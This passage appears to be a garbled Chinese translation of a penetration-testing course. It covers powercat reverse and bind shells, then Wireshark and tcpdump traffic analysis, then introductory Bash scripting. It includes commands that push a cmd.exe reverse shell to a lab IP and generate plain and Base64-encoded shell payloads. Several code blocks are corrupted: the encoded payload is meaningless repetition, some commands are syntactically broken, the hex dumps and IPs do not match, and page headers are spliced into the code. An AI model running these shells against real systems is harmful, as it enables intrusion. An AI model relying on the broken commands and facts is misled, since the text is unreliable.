+
+listening on (any) 443 ...
+```
+
+> 列表 116 - 使用 `nc` 设置监听器接收来自 `powercat` 的反弹 shell
+
+接下来，Bob 将使用 `powercat` 发送反弹 shell。在本例中，`-e` 选项指定要执行的应用程序 `cmd.exe`，我们建立连接监听端口：
+
+```powershell
+PS C:\Users\offsec> powercat -c 10.1.0.4 -p 443 -e cmd.exe
+```
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+(c) 2018 Microsoft Corporation. 保留所有权利。
+
+```
+C:\Users\offsec>
+```
+
+列表 118 - 获取 `powercat` 反向 shell
+
+## 4.3.7 Powercat 绑定 Shell
+
+相比之下，绑定 shell（bind shell）在 Bob 侧通过 `powercat` 监听器启动。我们将使用 `-l` 选项连接到监听器，使用 `-p` 指定监听端口，并使用 `-e` 在连接后执行应用程序（`cmd.exe`）：
+
+```powershell
+PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe
+```
+
+列表 119 - 使用 `powercat` 设置绑定 shell
+
+接下来，Alice 将创建一个 Netcat 连接到到 Bob 计算机上的绑定 shell：
+
+```bash
+kali@kali:~$ nc 10.11.0.22 443
+
+Microsoft Windows [Version 10.0.17134.590]
+
+(c) 2018 Microsoft Corporation. 保留所有权利。
+```
+
+```
+C:\Users\offsec>
+```
+
+列表 120 - 使用 `nc` 连接到 `powercat` 创建的绑定 shell
+
+## 4.3.8 Powercat 独立载荷
+
+`Powercat` 可以生成独立载荷（standalone payloads）。在 `powercat` 的语文中，载荷是一组 `powershell` 指令，以及 `powercat` 脚本中仅包含用户请求的功能部分。让我们在这个示例中对载荷进行实验：
+
+在启动监听器机器后，我们通过通过向 `powercat` 命令中添加 `-g` 选项并将输出重定向到文件，创建一个独立的反向 shell 载荷。这将产生 Bob 可以在机器上执行的 `powershell` 脚本：
+
+```powershell
+PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
+PS C:\Users\offsec> >revershell.ps1
+```
+
+列表 121 - 创建并执行独立载荷
+
+值得注意的是，独立载荷很容易被 IDS 检测到。具体而言，生成的脚本很大，大约有 300 行代码。此外，它还包含几个硬编码字符串，这些字符串可以很容易地用于恶意活动的特征识别。识别任何特定特征都不在本模块的范围之内，只需说明明文代码即可，因为其成功率可能很低，并且会被防御性解决方案拦截。
+
+我们可以尝试利用 PowerShell 执行 Base64 编码命令的能力来解决这个问题。要生成一个独立的编码载荷，我们使用 `-ge` 选项并再次将输出重定向到文件：
+
+> 99 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Payload_(computing)
+
+```powershell
+PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedrevershell.ps1
+```
+
+列表 122 - 使用 `powercat` 创建编码标准载荷
+
+该文件将包含一个编码字符串，该字符串可以使用 PowerShell `-E`（EncodedCommand）选项执行。然而，由于 `-E` 选项被设计为在命令行上提交命令的方法，`encodedrevershell.ps1` 脚本不能像你未编码的载荷那样直接执行。它需要在 shell 内部执行 `powercat -e`。
+
+
+
+```
+PS C:\Users\offsec> powershell.exe -E ZgB6AGAY8BAG4ABBUCAAW0B8AHIAZQAH8AGMAMQ8AFMBAZ0BAHUAKAIwIGBCAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIA
+```
+
+在运行了标准和编码载荷后，Alice 在她的监听器上收到了反向 shell：
+
+```
+kali@kali:~$ nc -lvnp 443
+
+listening on (any) 443
+
+connect to 10.11.0.4
+```
+
+列表 123 - 获取编码标准反向 shell
+
+我们涵盖了可以处理文件、绑定 shell 和反向 shell 的各种工具。这些工具在渗透测试期间具有各种功能、弱性和适用性。
+
+## 4.3.81 练习
+
+- 使用 PowerShell 和 `powercat` 在 Windows 系统上创建反向 shell。
+- 使用 PowerShell 和 `powercat` 在 Windows 系统上创建绑定 shell。
+- 使用 PowerShell 和 `powercat` 在 Windows 系统上创建编码 shell。
+
+## 4.4 Wireshark
+
+一名合格的渗透测试人员应该精通网络基础。作为行业标准的网络嗅器，Wireshark 是学习网络协议、分析网络流量和调试服务的必备工具。在本节中，我们将讨论 Wireshark 的基础知识。
+
+### 4.4.1 Wireshark 基础
+
+Wireshark 使用 `Libpcap`^101（Linux）或 `Winpcap`^102（Windows）库来捕获网络包。
+
+在使用嗅器分析网络流量时，很容易被收集到的数据量所淹没。为了方便分析，我们可以在 Wireshark 中应用捕获过滤器^103 和显示过滤器^104。在 Wireshark 会话期间，不匹配的包将被丢弃，剩余数据将传递给捕获引擎。捕获引擎随后对包进行解析、分析，并在显示输出之前应用任何显示过滤器。
+
+### 4.4.2 启动 Wireshark
+
+在下面的示例中，我们将捕捉匿名 FTP 登录期间的网络流量。在我们的 Kali 系统上，我们可以如列表 125 所示使用命令行或通过应用程序菜单（位于“嗅探与伪装”子菜单下）启动 Wireshark。
+
+```
+kali@kali:~ sudo wireshark
+```
+
+列表 125 - 从终端运行 wireshark
+
+### 4.4.3 捕获过滤器
+
+当 Wireshark 加载时，我们会看到一个基础窗口，可以在其中设置要监控的网络接口和显示过滤器。如前所述，我们可以通过丢弃任何不匹配过滤器的流量来减少捕获的流量，并将注意力集中在想要分析的包上。请注意，任何被捕获过滤器排除的流量都会丢失，因此如果你担心可能丢失数据，最好定义较宽的捕获过滤器。
+
+我们首先选择想要监控的接口并输入捕获过滤器。在这种情况下，我们使用 `net` 过滤器^105 仅捕获 `10.11.1.0/24` 地址范围内的流量：
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+Wireshark 网络分析器
+
+图 12：为 `tap0` 设置捕获过滤器
+
+也可以通过导航到 Capture（捕获）> Capture filters（捕获过滤器）从预定义的过滤器中选择，点击 + 号添加自己的捕获过滤器。使用捕获过滤器，我们可以从可用接口列表中双击网络接口 (`tap0`) 来开始捕获。
+
+## 4.4.4 显示过滤器
+
+现在 Wireshark 正在捕获本地网络上的所有流量，我们可以登录 FTP 服务器并检查流量：
+
+```
+kali@kali:~$ ftp 10.11.1.13
+
+Connected to 10.11.1.13.
+
+220 Microsoft FTP Service
+
+Name (10.11.1.13:kali): anonymous
+
+331 Anonymous access allowed, send identity (e-mail name) as password.
+
+Password anonymous
+
+230 Anonymous user logged in.
+
+Remote system type is Windows_NT.
+
+tp quit
+```
+
+图 126 - 在 FTP 服务器中记录过滤器
+
+为了进一步缩小背景流量，让我们利用显示过滤器（display filter）来仅关注 FTP 协议。显示过滤器比捕获过滤器灵活得多，语法也略有不同。顾名名义，显示过滤器过滤的是正在显示的包，而 Wireshark 在后台继续捕获 `10.11.1.0/24` 地址范围的所有网络流量。因此，可以通过点击显示过滤器右侧的“X”图标来清除过滤器，而无需重启捕获（图 13）。对于捕获过滤器，我们也可以通过 Analyze（分析）> Display filters（显示过滤器）从预定义列表中选择过滤器。
+
+让我们应用一个仅显示 FTP 数据或端口 21 上 TCP 流量的显示过滤器：
+
+图 13：为端口 21 的所有流量设置过滤器
+
+该过滤器效果良好。现在我们只能看到端口 21 FTP 流量。
+
+## 4.4 跟踪 TCP 流
+
+Wireshark 允许我们查看网络流量，包括每个包的内容。然而，我们通常对数据流更感兴趣，以便重组会话并各种格式显示。我们可以使用特定的 TCP 流，可以右键点击感兴趣的数据包（例如我们 FTP 会话包含的包），然后选择 Follow（跟踪）> TCP Stream：
+
+图 14：在 Wireshark 中跟踪 TCP 流
+
+重组后的 TCP 流更易读，我们可以回顾与 FTP 服务器的交互。因为 FTP 是明文协议，我们可以看到 FTP 客户端输出和接收到的内容：
+
+### 4.4.5.1 练习
+
+1. 使用 Wireshark 在尝试通过 Netcat 连接到端口 110 的 `10.11.1.217` 时捕获网络活动，然后尝试登录。
+2. 读取并理解输出。三次握手发生在哪里？连接何时关闭的？
+3. 跟踪 TCP 流以读取登录尝试。
+4. 使用显示过滤器仅监控端口 110 的流量。
+5. 运行新会话，这次使用捕获过滤器仅收集端口 110 的流量。
+
+## 4.5 Tcpdump
+
+`Tcpdump` 是一个基于文本的网络嗅探器，尽管缺乏图形界面，但它非常精简、强大且灵活。它是目前为止最常用的命令行数据包分析工具，可以在大多数 Unix 和 Linux 系统上找到，但缺乏捕获网络流量的用户权限。
+
+`Tcpdump` 可以从网络捕获流量并读取现有的捕获文件。让我们看看在防火墙上捕获的 `password_cracking_filtered.pcap` 文件中什么。下载文件并跟随我们分析数据。首先，我们将使用 `sudo` 启动 `tcpdump`（赋予权限）并使用 `-r` 打开文件：
+
+> 106 (`Tcpdump & Libcap`, 2019), http://www.tcpdump.org/
+> 107 (Offensive Security, 2019), https://www.offensive-security.com/pwk-online/password_cracking_filtered.pcap
+
+```
+kali@kali:~ sudo tcpdump -r password_cracking_filtered.pcap
+```
+
+
+
+`reading from file password_cracking_filtered.pcap, link-type (Ethernet)`
+
+```
+08:51:26.80091 IP 208.68.234.99.68509 > 172.16.40.181 Flags [S], seq 185584074, win 14680, (options [1460,sack,TS 2553253,nop,scale 7], length 0
+
+08:51:26.80801 IP 172.16.40.181 > 208.68.234.99.68509 Flags [S], seq 416685339, ack 185584074, win 14680, (options [1460,sack,TS 2553253,nop,scale 4], length 0
+
+08:51:26.808023 IP 208.68.234.99.68509 > 172.16.40.181 Flags [S], seq 185584074, win 14680, (options [1460,sack,TS 2553253,nop,scale 4], length 0
+
+08:51:26.808030 IP 172.16.40.181 > 208.68.234.99.68509 Flags [S], seq 416685339, ack 185584074, win 14680, (options [1460,sack,TS 2553253,nop,scale 4], length 0
+
+08:51:26.808014 IP 208.68.234.99.68509 > 172.16.40.181 Flags [S], seq 185584074, win 14680, (options [1460,sack,TS 2553253,nop,scale 4], length 0
+
+08:51:26.808081 IP 172.16.40.181 > 208.68.234.99.68509 Flags [S], seq 416685339, ack 185584074, win 14680, (options [1460,sack,TS 2553253,nop,scale 4], length 0
+```
+
+图 127 - 使用 `tcpdump` 读取捕获
+
+## 4.5.2 过滤流量
+
+输出信息有点混乱，让我们尝试使用 `awk` 和 `sort` 更好地理解 IP 地址和端口。
+
+首先，我们将使用 `-n` 选项跳过 DNS 并使用 `-r` 读取捕获文件。然后，我们将输出管道到 `awk`，打印目标 IP 地址和端口（第三字段），并管道到 `uniq -c` 以统计该字段在捕获中出现的次数。我们将使用 `head` 显示前 10 行：
+
+```
+kali@kali:~ sudo tcpdump -r password_cracking_filtered.pcap | awk -F " " |print $3 | sort | uniq -c | head
+
+12324 172.16.40.181
+
+18 208.68.234.99
+
+18 208.68.234.99
+
+18 208.68.234.99
+
+18 208.68.234.99
+
+18 208.68.234.99
+
+18 208.68.234.99
+
+18 208.68.234.99
+
+18 208.68.234.99
+
+18 208.68.234.99...
+```
+
+图 128 - 使用 `tcpdump` 读取和过滤
+
+我们可以看到 `172.16.40.10` 是最常见的地址，其次是 `208.68.234.99`。考虑到 `172.16.40.10` 连接的是低位端口，我们可以合理假设前者是服务器，后者是客户端。
+
+## 使用 Kali Linux 进行渗透测试
+
+我们也可以假设客户端向服务器发送了多次请求，但为了继续，我们可以使用过滤器更仔细地检查流量。为了过滤，我们将分别使用源 `src` 和目标 `dst` 输出。我们也可以通过端口 `-n port 81` 过滤跨端口 81 的源和目标流量。让我们尝试这些过滤器：
+
+```
+sudo tcpdump -n host 172.16.40.10 -r password_cracking_filtered.pcap
+
+08:51:20.81051 IP 172.16.40.10 > 208.68.234.99.68509 Flags [S], ack 416685339, ack 185584074, win 14680, (options [1460,sack,TS 2553253,nop,scale 4], length 10
+
+08:51:20.80253 IP 172.16.40.10 > 208.68.234.99.68509 Flags [], ack 98, (options [nop,nop,TS 2553253], length 0
+
+08:51:20.80148 IP 208.68.234.99.68509 > 172.16.40.10 Flags [S], seq 185584074, win 14680, (options [1460,sack,TS 2553253,nop,scale 7], length 0)
+```
+
+图 129 - 使用 `tcpdump` 过滤器
+
+我们继续使用 `awk` 和 `grep` 等命令行工具捕获此过滤输出，但让我们移动并实际检查某些包，看看能捕获什么类型。
+
+为了转储流量，我们将使用 `-X` 选项以 HEX 和 ASCII 格式打印包数据：
+
+```
+kali@kali: sudo tcpdump -nX -r password_cracking_filtered.pcap
+```
+
+```
+08:51:25.043862 IP 208.68.234.99.33133 > 172.168.40.81 Flags [P], seq 1:140, ack 1
+00000 4500 0f8b 4a0c 3096 652e d9a4 e6a3 E..........q.9....D.c
+00010 0a10 1c76 22a1 0051 a726 a77c 6f8d e68aa
+00020 0018 0073 1c76 0090 0181 08a5 b2f2 ..s.v....
+00030 0441 57e3 4745 24f2 6164 63d9 62e20 ..A./get//admin.
+00040 4854 5450 2f31 23d1 0a86 73f7 34a0 HTTP/1.1.Host:
+00050 6164 63d9 6e72 6526 6761 636d 7270 6f6e admin.megacorpon
+00060 652e 636f 63d3 03d4 0a57 6553 2d41 e.com:..User-A
+```
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+```
+0x0070:  6765 6e74 3a20 5465 6866 7265 7374      gent:.The.
+0x0080:  204c 66f2 6174 6572 6d2a 0064 6173 6963 2859      .Lobster..
+0x0090:  697a 6174 5761 6362 6d66 7562 3352 6c59      ization:.Basic.Y
+0x00a0:  5752 6174 466a 4462 6d66 7562 7933 6c59      WrtA46bbmFubRY3
+0x00b0:  3568 3272 7365 6373 3362 74 68 006d 00a0      2hub2xvXZ3...
+```
+
+
+
+列表 130 - 使用 `tcpdump` 读取流向 `172.16.40.10` 端口 `81` 的流量，其看起来像 HTTP 数据。事实上，这些类似于 HTTP 请求的内容包含了 Basic HTTP 认证，用户名为 "Teh Forest Logger"。这是某些发生异常情况的明显信号。
+
+为了揭开谜底的其余部分，我们需要依靠高级标头过滤。
+
+## 4.5.3 高级标头过滤
+
+在此处，为了检查转储文件中的请求和响应，我们希望过滤并仅显示数据包。为了做到这一点，我们寻找寻找开启了 PSH 和 ACK 标志位的数据包。在初始三次握手之后发送和接收的所有数据包都设置了 ACK 标志。PSH 标志¹⁰⁹ 用于强制立即交付数据包，通常用于交互式应用层协议以避免缓冲。
+
+下图描述了 TCP 头部，并显示了 TCP 标志从第 14 个字节开始定义。
+
+| 0 | 8 | 16 | 24 | 32 |
+|---|---|---|---|---|
+| | 源端口 | | 目的端口 |
+| | 序列号 | | | |
+| 确认号 | | | | |
+| 数据 | C E U A P R S F | | 窗口大小 |
+| 偏移 | 预留 W C R C S S Y I | | |
+| | R E G K H T N N | | | |
+| | 校验和 | | 紧急指针 |
+| | | 选项 | | 填充 |
+
+图 16：显示 14 字节标志的 TCP 数据包
+
+查看图 16，我们可以看到 ACK 和 PSH 分别由第 14 字节的第四位和第五位表示：
+
+```
+CEUPRSF
+
+WCRSSY
+
+REGHTNN
+
+00011000 = 十进制 24
+```
+
+列表 131 - 计算所需的位
+
+¹⁰⁹ (BARPA Internet Program, 1981), https://tools.ietf.org/html/rfc793
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。102
+
+OFFENSIVE SECURITY
+www.offensive-security.com
+
+使用 Kali Linux 2.0 进行渗透测试
+
+开启这些位将带给我们 00011000，即十进制的 24。
+
+```
+kali@kali:~$ echo "$(2#00011000)"
+```
+
+列表 132：在 bash 中将二进制位转换为十进制
+
+我们可以将此数字通过 `'tcp[13] = 24*'` 作为显示过滤器传递给 `tcpdump`，表示我们只想看到带有 ACK 和 PSH标志位（数据包）的数据包，这些位由 tcp 头部第 14 字节的第四位和第五位（24）表示。请记住，`tcpdump` 数组索引是从零开始计算位数的，因此语法应该是 `(tcp[13])`。
+
+这两个标志的组合有望让我们能够仅查看那些设置了 ACK 或 PSH 标志的 HTTP 请求和响应：
+
+```
+kali@kali:~$ sudo tcpdump -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
+
+06:51:20.802032 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [P], seq 1855084075-1
+
+E..s.M@..E.C.
+
+J..n.q......S1...
+
+..A......GET HTTP/1.1
+
+Host: admin.megacorpone.com
+
+User-Agent: Teh Forest Lobster
+
+E....@..E....
+
+D.C.q.^...E..I?
+
+..A......HTTP/1.1 401 Authorization Required
+
+Date: 22 Apr 2013 12:51:20 GMT
+
+Server: Apache/2.2.20 (Ubuntu)
+
+WWW-Authentication: Basic realm="Password Protected Area"
+
+Vary: Accept-Encoding
+
+Content-Length: 48
+
+Content-Type: text/html; charset=iso-859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML/2.0//EN">
+
+<html><head>
+
+<title>401 Authorization Required</title>
+
+<html><body>
+
+<p>The server could not verify that you are authorized to access the document. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn't understand how to supply the credentials.</p>
+
+<address>Apache/2.2.20 (Ubuntu) Server at admin.megacorpone.com Port 81</address>
+
+</body></html>
+```
+
+```
+08:51:25.4432 IP 172.16.40.10.81 > 208.68.234.99.60509
+
+E..s.M@..E.C.
+
+J..n.q......S1...
+
+..A......GET HTTP/1.1 
+
+Date: 22 Apr 2013 12:51:25 GMT
+
+Server: Apache/2.2.20 (Ubuntu)
+
+Location: http://admin.megacorpone.com/admin/
+
+Vary: Accept-Encoding
+
+Content-Length: 48
+
+Content-Type: text/html; charset=iso-859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML/2.0//EN">
+
+<html><head>
+
+<title>301 Moved Permanently</title>
+
+</head><h1>Moved Permanently</h1>
+
+<p>The document has moved <a href="http://admin.megacorpone.com/admin/">here</a>.</p>
+
+<hr>
+
+<address>Apache/2.2.20 (Ubuntu) Server at admin.megacorpone.com Port 81</address>
+
+</body></html>
+```
+
+列表 133 - 使用带有过滤的 tcpdump
+
+从这里，我们的变得清晰了。我们看到了大量尝试认证 /admin 目录，这导致了 HTTP 401 回复，而最后一次尝试成功了，服务器回复了 301 响应。似乎有人访问了 megacorpone 的服务器！
+
+### 4.5.3.1 练习
+
+- 1. 使用 `tcpdump` 重现在端口 81 捕获流量的 Wireshark 练习。
+- 2. 使用 `-X` 标志查看数据包内容。如果数据被截断，研究 `-s` 标志可能有所帮助。
+- 3. 在 `password_cracking_filtered.pcap` 文件查找所有 'SYN'、'ACK' 和 'RST' 数据包。
+- 4. 另一种语法可以使用更用户的过滤器来显示 ACK 和 PSH 数据包。在 `tcpdump` 手册中搜索 "flags" 以探索此语法。设计一个用于 ACK 和 PSH 数据的显示过滤器。
+
+## 4.6 总结
+
+在本模块中，我们演示了每个渗透者常用的实用工具，包括 Netcat、Socat、PowerShell、Wireshark 和 Tcpdump。这些工具在渗透测试过程中可以很多帮助，特别是当目标缺少专用工具或我们需要传输工具以扩展目标网络上的权限时。
+
+# 脚本
+
+GNU Bourne-Again Shell (Bash) 是一个强大的工作环境和脚本引擎。专业的安全人员利用 Bash 脚本来简化和自动化许多 Linux 任务和程序。在本模块中我们将介绍 Bash 脚本并探索几个实际场景。
+
+## Bash 脚本简介
+
+Bash 脚本是一个纯文本文件，包含了一系列命令，其执行方式就像在终端提示符处输入的一样。通常，Bash 脚本具有可选的扩展 `.sh`（为了方便识别），带有 `#!/bin/bash` 并在执行之前必须具有执行权限。让我们从一个简单的 "Hello World" 脚本开始：
+
+```
+kali@kali:~$ cat ./hello-world.sh
+
+#!/bin/bash
+
+# Hello World Script
+
+echo "Hello World!"
+```
+
+
+
+### 列表 134 - 创建简单的 'Hello World' 脚本
+
+此脚本包含各个组件：
+
+- 第一行：被称为 `shebang`，`Bash` 解释器会忽略它。第二部分 `/bin/bash` 是解释器的绝对路径，用于运行脚本。这使得它成为“Bash 脚本”，而不是其他的 shell 脚本，例如“C Shell 脚本”。
+- 第二行：用于添加注释，因此之后的所有文本都会被忽略。
+- 第三行：`echo "Hello World"` 使用 Linux `echo` 命令将给字符串打印到终端，在这种情况下字符串是 "Hello World!"。
+
+接下来，让脚本变为可执行并运行：
+
+```
+kali@kali:- chmod +x hello-world.sh
+kali@kali:- ./hello-world.sh
+Hello World!
+```
+
+### 列表 135 - 运行‘简单的 Hello World’脚本
+
+该命令同 `+x` 选项用于使脚本变为可执行，而 `./hello-world.sh` 用于实际运行它。`./` 表示法可能看起来很困，但这仅仅是路径表示，指示该脚本位于当前目录。每当你输入命令时，`Bash` 都会尝试在名为 `PATH` 的一系列目录中查找它。
+
+## 5.2 变量
+
+变量是命名的点，用于临时存储数据。我们可以（设置或“声明”）一个变量并为其赋值一个值，或者读取一个变量，它将“展开”或“解析”为其存储的值。
+
+我们可以声明变量。最简单的方法直接通过简单的 `名=值` 设置值。注意等号前后没有空格：
+
+```
+kali@kali:- first_name=Good
+```
+
+#### 列表 136 - 声明变量
+
+变量名可以是大写、小写或两者混合。然而，`Bash` 对大小写敏感，因此我们在声明和扩展变量时必须保持一致。此外，使用描述性的变量名是一个良好的习惯，这使得我们的脚本更易读。
+
+```
+kali@kali:- first_name=Good
+kali@kali:- last_name=Hacker
+```
+
+```
+kali@kali:- echo first_name $last_name
+Good Hacker
+```
+
+#### 列表 137 - 声明并显示我们的变量
+
+声明变量除非我们可以引用它。为了这样做，我们在变量前加上 `$` 字符。当 `Bash` 在命令中遇到这种语法时，它会在执行之前将变量替换为它的值（展开变量）。
+
+注意 `Bash` 以特定的方式解释字符。例如，这个声明演示了不正确的多值指定：
+
+```
+kali@kali:- greeting=Hello World
+bash: World: command not found
+```
+
+这并不符合我们预期的。为了修复这个问题，我们可以使用单引号 (`''`) 或双引号 (`"`) 来包裹我们的文本。然而，`Bash` 处理单双引号的方式不同。当遇到单引号时，`Bash` 字面解释其中的每个字符。当在双引号内时，所有字符都被视为字面的 `$`，并且有意义的变量将在对封闭文本的初始替换传递中展开。
+
+一个简单的示例将清楚这一点：
+
+```
+kali@kali:- greeting='Hello World'
+```
+
+# 攻击性安全
+
+基于 Kali Linux 的渗透测试 2.0
+
+```
+kali@kali:~$ echo $greeting
+Hello World
+```
+
+```
+kali@kali:~$ echo greeting2="New $greeting"
+```
+
+```
+kali@kali:~$ echo $greeting
+Hello World
+```
+
+#### 列表 139 - 使用单引号包裹的 greeting 声明精确地保留了文本的值，并且没有将空格解释为命令分隔符。然而，在双引号包裹的 greeting2 声明中，Bash 将 `$greeting` 扩展为它的值 "Hello World"，遵循了 "$" 字符的特殊含义。
+
+我们还可以选择命令或程序结果的值。当使用命令替换¹¹⁵时，这是可能的，命令替换允许我们获取命令或程序的输出（通常情况下打印到屏幕上的内容）并将其保存为变量的值。
+
+要做到这一点，请将值放在括号 `( )` 中，并在前面加一个 `$` 字符：
+
+```
+kali@kali:~$ user=$(whoami)
+kali@kali:~$ echo $user
+kali
+```
+
+#### 列表 140 - 演示命令替换和变量的使用
+
+在 140 中，我们将 `whoami` 命令的输出赋值给 `user` 变量。然后我们显示了它的值。使用反引号（或波浪符，`` ``）进行命令替换的另一种语法如下所示：
+
+```
+kali@kali:~$ user2=`whoami`
+kali@kali:~$ echo $user2
+kali
+```
+
+#### 列表 141 - 命令替换的另一种语法
+
+反引号方法较老旧，通常不被推荐，因为这两种命令替换方法的行为存在差异¹¹⁶。同样重要的是，shell 中的命令替换会影响子壳中变量的变化，但将不会影响主进程的变量。这在以下示例中得到了证明：
+
+```
+kali@kali:~$ cat ./subshell.sh
+#!/bin/bash -x
+var1=value1
+echo $var1
+var2=value2
+echo $var2
+```
+
+¹¹⁵ (GNU, 2019), https://www.gnu.org/software/bash/manual/html_node/Command-Substitution
+¹¹⁶ (BashFAQ, 2016), http://mywiki.wooledge.org/BashFAQ/082
+
+# 攻击性安全
+www.offensive-security.com
+
+基于 Kali Linux 的渗透测试 2.0
+
+```
+$var1=newvar1
+echo $var1
+```
+
+```
+var2=newvar2
+echo $var2
+```
+
+```
+kali@kali:- ./subshell.sh
++ var1=value1
++ echo value1
+value1
++ var2=value2
++ echo value2
+value2
+++ var1=newvar1
++ echo value1
+value1
++ var2=newvar2
++ echo value2
+value2
+kali@kali:-
+```
+
+#### 列表 142 - 子壳中的命令替换
+
+这让我们能够清楚地看到 `var1` 和 `var2` 的第二次声明发生在子壳内部，并没有像初始声明那样改变 shell 中的值。
+
+## 5.2.1 参数
+
+并不是所有的 Bash 脚本都需要参数。然而，理解 Bash 如何解释它们以及如何使用它们是极关重要的。我们已经执行过带有参数的 Linux 命令了。当我们运行命令 `ls -l /var/log` 时，`-l` 和 `/var/log` 都是参数。
+
+Bash 脚本也并无不同；我们可以提供命令行参数并在我们的脚本中使用它们：
+
+```
+kali@kali:- cat ./arg.sh
+#!/bin/bash
+echo "The first two arguments are $1 and $2"
+```
+
+```
+kali@kali:- chmod +x ./arg.sh
+kali@kali:- ./arg.sh hello here
+The first two arguments are hello and here
+```
+
+#### 列表 143 - 演示 bash 中参数的使用
+
+在列表 143 中，我们创建了一个简单的 Bash 脚本，为其设置了可执行权限，然后用两个参数运行了它。变量 `$1` 和 `$2` 代表传递给脚本的第一个和第二个参数。让我们探索一些特殊的 Bash 变量：
+
+| 变量名 | 说明 |
+| :--- | :--- |
+| `$0` | Bash 脚本的名字 |
+| `$1-$9` | 传递给脚本的前 9 个参数 |
+| `$@` | 传递给脚本的参数数量 |
+| `$@` | 传递给脚本的所有参数 |
+| `$?` | 最近一次运行进程的退出状态 |
+| `$$` | 当前脚本的进程 ID (PID) |
+| `$USER` | 运行脚本的用户名 |
+| `$HOSTNAME` | 机器的主机名 |
+| `$RANDOM` | 一个随机数 |
+| `$LINENO` | 脚本中的当前行号 |
+
+表 4 - 特殊 Bash 变量
+
+这些特殊变量中的某些在调试脚本时非常有用。例如，我们可能获取命令的退出状态，以判断它是否成功执行。
+
+## 5.2.2 读取用户输入
+
+命令行参数是用户输入的一种形式，但我们也可以在脚本运行时使用 `read` 命令捕捉交互式用户输入。在这个示例中，我们将使用 `read` 来捕捉用户输入并将其赋值给变量。
+
+```
+kali@kali:~$ read -p "Enter your name: " name
+John
+echo "Hello, $name"
+Hello, John
+```
+
+#### 列表 144 - 收集用户输入
+
+我们还可以使用 `-p` 选项在用户输入之前显示提示符。
+
+```bash
+kali@kali:- cat ./input.sh
+```
+
+
+
+#!/bin/bash
+
+read -p "Enter your age: " age
+
+echo "You are $age old."
+
+```
+```
+kali@kali:- chmod +x ./input.sh
+
+kali@kali:- ./input.sh
+
+Enter your age: 25
+
+You are 25 old.
+
+```
+
+列表 145 - 在 `read` 中使用 `-p` 选项
+
+我们还可以使用 `-n` 选项来限制用户输入的字符数。
+
+```bash
+kali@kali:- cat ./input.sh
+
+#!/bin/bash
+
+read -n 1 -p "Press any key to continue..." key
+
+echo -e "\nYou pressed: $key"
+```
+
+列表 146 - 在 `read` 中使用 `-n` 选项
+
+## 5.3 If, Else, Elif 语句
+
+条件语句允许根据不同的条件执行操作。常见的 `if` 语句包括 `if`、`else` 和 `elif`。`if` 语句的语法如下：
+
+```bash
+if [ <some test > 
+then
+  <some action>
+fi
+```
+
+在这个示例中，我们使用括号检查年龄是否小于 16。
+
+```bash
+kali@kali:- cat ./if.sh
+
+#!/bin/bash
+
+read -p "What is your age: " age
+
+if [ $age -lt 16 ]
+then
+  echo "You might need permission to take this course."
+else
+  echo "You are eligible!"
+fi
+```
+
+```
+kali@kali:- chmod +x ./if.sh
+
+kali@kali:- ./if.sh
+
+What is your age: 15
+
+You might need permission to take this course.
+```
+
+列表 147 - 使用 `if` 语句
+
+虽然这个示例在功能上与括号的示例等效，但括号会让代码稍微易读。
+
+```bash
+kali@kali:- cat ./if2.sh
+
+#!/bin/bash
+
+read -p "What is your age: " age
+
+if test $age -lt 16
+then
+  echo "You might need permission to take this course."
+else
+  echo "You are eligible!"
+fi
+```
+
+```
+kali@kali:- chmod +x ./if2.sh
+
+kali@kali:- ./if2.sh
+
+What is your age: 15
+
+You might need permission to take this course.
+```
+
+列表 148 - 在 `if` 语句中使用 `test` 命令
+
+使用 Kali Linux 2.0 进行渗透测试
+
+```
+<perform another action>
+fi
+```
+
+列表 149 - `else` 语句的通用语法
+
+让我们扩展之前的 `kali:-$ "age"` 示例以包含 `else` 语句：
+
+```
+kali@kali:-$ cat /.else.sh
+!/bin/bash
+
+# else statement example
+
+read -p "What is your age: " age
+if [ $age -lt 16 ]
+then
+    echo "You might need parental permission to take this course!"
+else
+    echo "Welcome to the course!"
+fi
+
+kali@kali:-$ chmod +x ./else.sh
+
+kali@kali:-$ ./else.sh
+
+What is your age: 21
+
+Welcome to the course!
+```
+
+列表 150 - 在 Bash 中使用 `else` 语句
+
+注意，当输入的年龄大于 16（或更具体地说“不小于”16）时，执行了 `else` 语句。
+
